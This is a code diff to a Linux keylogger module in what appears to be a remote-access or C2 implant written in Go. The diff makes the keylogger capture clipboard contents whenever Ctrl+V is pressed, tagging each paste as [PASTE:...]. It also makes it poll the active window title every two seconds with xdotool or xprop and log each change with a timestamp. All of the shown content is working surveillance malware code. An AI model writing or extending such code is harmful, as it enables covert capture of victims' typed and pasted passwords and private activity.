@@ -30,13 +30,15 @@ const (
 
 // keylogState holds the global keylogger state.
 type keylogState struct {
-	mu        sync.Mutex
-	running   bool
-	stopCh    chan struct{}
-	buffer    strings.Builder
-	startTime time.Time
-	keyCount  int
-	shiftDown bool
+	mu         sync.Mutex
+	running    bool
+	stopCh     chan struct{}
+	buffer     strings.Builder
+	startTime  time.Time
+	keyCount   int
+	shiftDown  bool
+	ctrlDown   bool
+	lastWindow string
 }
 
 var kl = &keylogState{}
@@ -88,6 +90,8 @@ func keylogStart() structs.CommandResult {
 	kl.startTime = time.Now()
 	kl.keyCount = 0
 	kl.shiftDown = false
+	kl.ctrlDown = false
+	kl.lastWindow = ""
 	kl.stopCh = make(chan struct{})
 	kl.mu.Unlock()
 
@@ -105,8 +109,9 @@ func keylogStart() structs.CommandResult {
 	for _, dev := range devices {
 		go keylogReadDevice(dev, kl.stopCh)
 	}
+	go trackActiveWindowLinux(kl.stopCh)
 
-	return successf("Keylogger started on %d device(s). Use 'keylog -action dump' to view captured keystrokes, 'keylog -action stop' to stop.", len(devices))
+	return successf("Keylogger started on %d device(s) with window tracking. Use 'keylog -action dump' to view, 'keylog -action stop' to stop.", len(devices))
 }
 
 func keylogStop() structs.CommandResult {
@@ -309,9 +314,32 @@ func keylogReadDevice(path string, stopCh <-chan struct{}) {
 			kl.mu.Unlock()
 			continue
 		}
+		if ev.Code == 29 || ev.Code == 97 { // KEY_LEFTCTRL, KEY_RIGHTCTRL
+			kl.ctrlDown = ev.Value != 0
+			kl.mu.Unlock()
+			continue
+		}
 
 		// Only process key press events (value=1), not release(0) or repeat(2)
 		if ev.Value == 1 {
+			// Detect Ctrl+V paste and capture clipboard content
+			if kl.ctrlDown && ev.Code == 47 { // KEY_V = 47
+				kl.mu.Unlock()
+				if clip := clipReadText(); clip != "" {
+					kl.mu.Lock()
+					if len(clip) > 200 {
+						clip = clip[:200] + "..."
+					}
+					kl.buffer.WriteString(fmt.Sprintf("[PASTE:%s]", clip))
+					kl.keyCount++
+					kl.mu.Unlock()
+				} else {
+					kl.mu.Lock()
+					kl.keyCount++
+					kl.mu.Unlock()
+				}
+				continue
+			}
 			keyName := linuxKeyToString(ev.Code, kl.shiftDown)
 			if keyName != "" {
 				kl.buffer.WriteString(keyName)
@@ -321,5 +349,60 @@ func keylogReadDevice(path string, stopCh <-chan struct{}) {
 
 		kl.mu.Unlock()
 	}
+}
+
+// trackActiveWindowLinux periodically polls the active window title via
+// xdotool (X11) or swaymsg (Wayland). Logs window changes to the buffer.
+func trackActiveWindowLinux(stopCh <-chan struct{}) {
+	ticker := time.NewTicker(2 * time.Second)
+	defer ticker.Stop()
+
+	for {
+		select {
+		case <-stopCh:
+			return
+		case <-ticker.C:
+			title := getActiveWindowLinux()
+			if title == "" {
+				continue
+			}
+			kl.mu.Lock()
+			if title != kl.lastWindow {
+				kl.buffer.WriteString(fmt.Sprintf("\n[%s] --- %s ---\n",
+					time.Now().Format("15:04:05"), title))
+				kl.lastWindow = title
+			}
+			kl.mu.Unlock()
+		}
+	}
+}
+
+// getActiveWindowLinux returns the active window title using available tools.
+func getActiveWindowLinux() string {
+	// Try xdotool first (X11)
+	if out, err := execCmdTimeoutOutput("xdotool", "getactivewindow", "getwindowname"); err == nil {
+		if title := strings.TrimSpace(string(out)); title != "" {
+			return title
+		}
+	}
+
+	// Try xprop with _NET_WM_NAME (X11, no xdotool dependency)
+	if out, err := execCmdTimeoutOutput("xprop", "-root", "_NET_ACTIVE_WINDOW"); err == nil {
+		s := strings.TrimSpace(string(out))
+		// Parse: _NET_ACTIVE_WINDOW(WINDOW): window id # 0x1234567
+		if idx := strings.LastIndex(s, "# "); idx != -1 {
+			windowID := strings.TrimSpace(s[idx+2:])
+			if nameOut, err := execCmdTimeoutOutput("xprop", "-id", windowID, "_NET_WM_NAME"); err == nil {
+				nameStr := string(nameOut)
+				if qStart := strings.Index(nameStr, "\""); qStart != -1 {
+					if qEnd := strings.LastIndex(nameStr, "\""); qEnd > qStart {
+						return nameStr[qStart+1 : qEnd]
+					}
+				}
+			}
+		}
+	}
+
+	return ""
 }
 
